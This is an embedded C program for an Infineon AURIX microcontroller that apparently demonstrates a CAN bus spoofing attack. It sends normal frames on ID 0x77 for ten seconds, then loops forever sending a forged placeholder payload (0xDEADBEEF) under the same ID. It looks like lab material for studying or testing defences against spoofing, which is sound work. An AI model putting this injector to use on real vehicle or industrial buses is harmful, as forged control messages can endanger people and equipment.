#include "Ifx_Types.h"
#include "IfxCpu.h"
#include "IfxScuWdt.h"
#include "MCMCAN.h"
#include "Bsp.h"

IFX_ALIGN(4) IfxCpu_syncEvent g_cpuSyncEvent = 0;
extern McmcanType g_mcmcan; // Make the global CAN struct visible

/* --- MODIFICATION ---
 * Create a new function to send a custom data payload.
 * This makes it easy to switch between legitimate and malicious data.
 */
void transmitCustomMessage(uint32 data0, uint32 data1)
{
    /* Use the custom data provided instead of the default macros */
    g_mcmcan.txData[0] = data0;
    g_mcmcan.txData[1] = data1;

    /* The rest of the send logic is the same */
    IfxCan_Can_initMessage(&g_mcmcan.txMsg);
    g_mcmcan.txMsg.messageId = CAN_MESSAGE_ID; // Still using the legitimate ID 0x77
    while( IfxCan_Status_notSentBusy ==
           IfxCan_Can_sendMessage(&g_mcmcan.canSrcNode, &g_mcmcan.txMsg, &g_mcmcan.txData[0]) )
    {
    }
}


void core0_main(void)
{
    IfxCpu_enableInterrupts();
    IfxScuWdt_disableCpuWatchdog(IfxScuWdt_getCpuWatchdogPassword());
    IfxScuWdt_disableSafetyWatchdog(IfxScuWdt_getSafetyWatchdogPassword());
    IfxCpu_emitEvent(&g_cpuSyncEvent);
    IfxCpu_waitEvent(&g_cpuSyncEvent, 1);

    initMcmcan();
    initLeds();

    /* Phase 1: Normal Operation for 10 seconds */
    uint32 normalOperationSeconds = 10;
    for(uint32 i = 0; i < normalOperationSeconds; i++)
    {
        /* Send the legitimate message with the correct data */
        transmitCustomMessage(TX_DATA_LOW_WORD, TX_DATA_HIGH_WORD);
        waitTime(IfxStm_getTicksFromMilliseconds(BSP_DEFAULT_TIMER, 1000));
    }

    /* --- ATTACK ---
     * Phase 2: Spoofing Attack
     * We now send a malicious payload but keep the ID the same (0x77).
     */
    uint32 maliciousDataLow  = 0xDEADBEEF; // A common "hacker" value
    uint32 maliciousDataHigh = 0xBADF00D;  // Another "hacker" value

    while(1)
    {
        /* Send the spoofed message every second */
        transmitCustomMessage(maliciousDataLow, maliciousDataHigh);
        waitTime(IfxStm_getTicksFromMilliseconds(BSP_DEFAULT_TIMER, 1000));
    }
}
